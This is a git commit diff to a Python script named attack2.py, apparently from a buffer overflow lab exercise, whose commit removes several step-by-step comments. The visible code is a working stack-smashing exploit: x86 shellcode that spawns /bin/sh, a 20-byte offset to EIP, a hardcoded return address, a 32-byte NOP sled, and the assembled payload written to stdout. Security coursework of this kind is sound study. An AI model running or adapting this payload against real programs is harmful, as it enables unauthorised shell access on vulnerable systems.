6e30d6bea9d25d052007ef51e29c142e4d48d0e2
Kian <68297864+Sine-Of-Time@users.noreply.github.com>
2025-04-09 17:22:24 -0400

    Update attack2.py

--- Buffer_OverflowBroke/attack2.py
+++ Buffer_OverflowBroke/attack2.py
@@ -9,10 +9,8 @@ shellcode = (
     b"\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
 )
 
-# 1) Figure out the correct offset to EIP (assume 20 for now)
 offset = 20
 
-# 2) Decide on a return address (from gdb or trial and error)
 #return_address = 0xffffd6d1
 return_address = 0xffffd278 #This will prbly be different for you
 ret_addr_bytes = struct.pack("<I", return_address)
@@ -20,17 +18,14 @@ ret_addr_bytes = struct.pack("<I", return_address)
 # Print out ret_addr_bytes
 #print(f"Return address bytes: {ret_addr_bytes}")
 
-# 3) Choose a NOP sled size
 nop_sled_size = 32
 nop_sled = b"\x90" * nop_sled_size
-
 # Construct payload
 payload  = b"A" * offset
 payload += ret_addr_bytes
 payload += nop_sled
 payload += shellcode
 
-# Write to stdout
 sys.stdout.buffer.write(payload)
 #So buffer is being overflowed and eip is the desired address after seg fault
 
